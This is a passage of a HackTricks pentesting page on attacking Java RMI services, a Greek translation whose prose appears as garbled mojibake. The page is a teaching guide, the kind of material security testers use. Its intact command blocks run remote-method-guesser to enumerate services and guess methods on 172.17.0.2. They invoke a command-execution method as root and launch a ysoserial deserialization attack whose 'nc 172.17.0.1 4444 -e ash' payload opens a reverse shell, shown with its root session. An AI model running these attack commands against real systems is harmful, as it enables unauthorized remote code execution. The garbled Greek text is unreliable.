ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…, Î±Ï…Ï„Î¬ Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î±, ÎµÏ€ÎµÎ¹Î´Î® Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î³Î½Ï‰ÏƒÏ„Î­Ï‚ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ / Î´Î¹ÎµÏ€Î±Ï†Î­Ï‚ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏÎºÎ¿Î»Î¿ Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎµÏ„Îµ Î¼Î±Î¶Î¯ Ï„Î¿Ï…Ï‚. Î‘Ï…Ï„Î® Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® Î³Î¹Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ _RMI_. Î“Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Î¼Î­Î¸Î¿Î´Î¿ ÏƒÎµ Î­Î½Î± _Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿_, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ ÎµÎº Ï„Ï‰Î½ Ï€ÏÎ¿Ï„Î­ÏÏ‰Î½ Ï„Î·Î½ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…. Î§Ï‰ÏÎ¯Ï‚ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…, Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Ï„ÏÏŒÏ€Î¿Ï‚ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±Ï‚ Î¼Îµ Î¼Î¹Î± _Ï…Ï€Î·ÏÎµÏƒÎ¯Î± RMI_.

## Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· RMI

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÏƒÎ¬ÏÏ‰ÏƒÎ·Ï‚ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ _Java RMI_ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î¹ÎºÎ±Î½ÏŒ Î½Î± Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÎºÎ¿Î¹Î½Î­Ï‚ _ÎµÏ…Ï€Î±Î¸ÎµÎ¯ÎµÏ‚ RMI_. ÎŒÏ€Î¿Ï„Îµ ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Î­Î½Î± _RMI_ ÏƒÎ·Î¼ÎµÎ¯Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ:
```
$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff7, 3638117546492248534]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ffc, 708796783031663206]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```
Î— Î­Î¾Î¿Î´Î¿Ï‚ Ï„Î·Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±Ï‚ Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÏÏ‚ ÏƒÏ„Î¹Ï‚ [ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·Ï‚](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/actions.md#enum-action) Ï„Î¿Ï… Î­ÏÎ³Î¿Ï…. Î‘Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î±, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÎµÏ„Îµ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏ…Ï€Î±Î¸ÎµÎ¯ÎµÏ‚.

ÎŸÎ¹ Ï„Î¹Î¼Î­Ï‚ `ObjID` Ï€Î¿Ï… ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ _remote-method-guesser_ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î¿ Ï‡ÏÏŒÎ½Î¿Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ ÏƒÏ„Î·Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Î¬Î»Î»Ï‰Î½ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½:
```
$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] ObjNum: 		-4004948013687638236
[+] UID:
[+] 	Unique: 	1442798173
[+] 	Time: 		1640761503828 (Dec 29,2021 08:05)
[+] 	Count: 		-32760
```
## Î•Î¾Î±Î½Î±Î³ÎºÎ±ÏƒÏ„Î¹ÎºÎ® Î”Î¿ÎºÎ¹Î¼Î® ÎœÎµÎ¸ÏŒÎ´Ï‰Î½ Î‘Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Ï‰Î½

Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ ÏŒÏ„Î±Î½ Î´ÎµÎ½ Î­Ï‡Î¿Ï…Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÏ„ÎµÎ¯ ÎµÏ…Ï€Î±Î¸ÎµÎ¯ÎµÏ‚ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î·Ï‚ Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·Ï‚, Î¿Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ _RMI_ ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„Î¿Ï…Î½ ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½ÎµÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï€Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î· ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± _RMI_ Î¼Îµ Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± _RMI_ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï†Î¯Î»Ï„ÏÎ± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚, ÏŒÏ„Î±Î½ Î³Î¯Î½ÎµÏ„Î±Î¹ Î»ÏŒÎ³Î¿Ï‚ Î³Î¹Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ _RMI_, Ï„Î­Ï„Î¿Î¹Î± Ï†Î¯Î»Ï„ÏÎ± ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½. Î— Î³Î½ÏÏƒÎ· Ï„Ï‰Î½ Î­Î³ÎºÏ…ÏÏ‰Î½ Ï…Ï€Î¿Î³ÏÎ±Ï†ÏÎ½ Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ ÏƒÏ„Î¹Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ _RMI_ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Ï€Î¿Î»ÏÏ„Î¹Î¼Î·.

Î”Ï…ÏƒÏ„Ï…Ï‡ÏÏ‚, Ï„Î¿ _Java RMI_ Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ ÏƒÎµ _Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±_. Î©ÏƒÏ„ÏŒÏƒÎ¿, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ¾Î±Î½Î±Î³ÎºÎ±ÏƒÏ„ÎµÎ¯ Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ Î¼Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) Î® Ï„Î¿ [rmiscout](https://github.com/BishopFox/rmiscout):
```
$ rmg guess 172.17.0.2 9010
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
```
ÎŸÎ¹ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ»Î·Î¸Î¿ÏÎ½ Ï‰Ï‚ ÎµÎ¾Î®Ï‚:
```
$ rmg call 172.17.0.2 9010 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar
[+] uid=0(root) gid=0(root) groups=0(root)
```
Î‰ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î±Ï€Î¿ÏƒÏ…ÏƒÎºÎµÏ…Î±ÏƒÎ¯Î±Ï‚ ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„Î®:
```
$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.lang.String on position 0
[+] 	Specified method signature is String execute(String dummy)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.
[+] 	Deserialization attack probably worked :)

$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45479.
id
uid=0(root) gid=0(root) groups=0(root)
```
Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÎµ Î±Ï…Ï„Î¬ Ï„Î± Î¬ÏÎ¸ÏÎ±:

* [Î•Ï€Î¯Î¸ÎµÏƒÎ· ÏƒÎµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Java RMI Î¼ÎµÏ„Î¬ Ï„Î¿ JEP 290](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
* [ÎœÎ¬Î½Ï„ÎµÏˆÎ· ÎœÎµÎ¸ÏŒÎ´Ï‰Î½](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/method-guessing.md)
* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://bishopfox.com/blog/rmiscout)

Î•ÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Ï„Î· Î¼Î¬Î½Ï„ÎµÏˆÎ·, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÏˆÎ¬Î¾ÎµÏ„Îµ ÏƒÎµ Î¼Î·Ï‡Î±Î½Î­Ï‚ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ Î® ÏƒÏ„Î¿ _GitHub_ Î³Î¹Î± Ï„Î· Î´Î¹ÎµÏ€Î±Ï†Î® Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î¹Î±Ï‚ ÏƒÏ…Î½Î±Î½Ï„Î·Î¸ÎµÎ¯ÏƒÎ±Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ _RMI_. Î¤Î¿ _bound name_ ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î·Ï‚ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·Ï‚ ÎºÎ»Î¬ÏƒÎ·Ï‚ Î® Î´Î¹ÎµÏ€Î±Ï†Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î± ÎµÎ´Ï.

## Î“Î½Ï‰ÏƒÏ„Î­Ï‚ Î”Î¹ÎµÏ€Î±Ï†Î­Ï‚

Î¤Î¿ [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) ÎµÏ€Î¹ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Î® Î´Î¹ÎµÏ€Î±Ï†Î­Ï‚ Ï‰Ï‚ `Î³Î½Ï‰ÏƒÏ„Î­Ï‚` ÎµÎ¬Î½ Î±Î½Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î·Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï… ÎµÏÎ³Î±Î»ÎµÎ¯Î¿Ï… Î³Î¹Î± Î³Î½Ï‰ÏƒÏ„Î­Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ _RMI_. Î£Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± `Î³Î½Ï‰ÏƒÏ„Î®` Î³Î¹Î± Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± _RMI_:
```
$ rmg enum 172.17.0.2 1090 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]

$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
```
## Shodan

* `port:1099 java`

## Î•ÏÎ³Î±Î»ÎµÎ¯Î±

* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://github.com/BishopFox/rmiscout)
* [BaRMIe](https://github.com/NickstaDB/BaRMIe)

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
```
Protocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.
Port_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.
Protocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out

Entry_1:
Name: Enumeration
Description: Perform basic enumeration of an RMI service
Command: rmg enum {IP} {PORT}
```
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=1099-pentesting-java-rmi) Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î¬ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Î¼Îµ Ï„Î± Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=1099-pentesting-java-rmi" %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
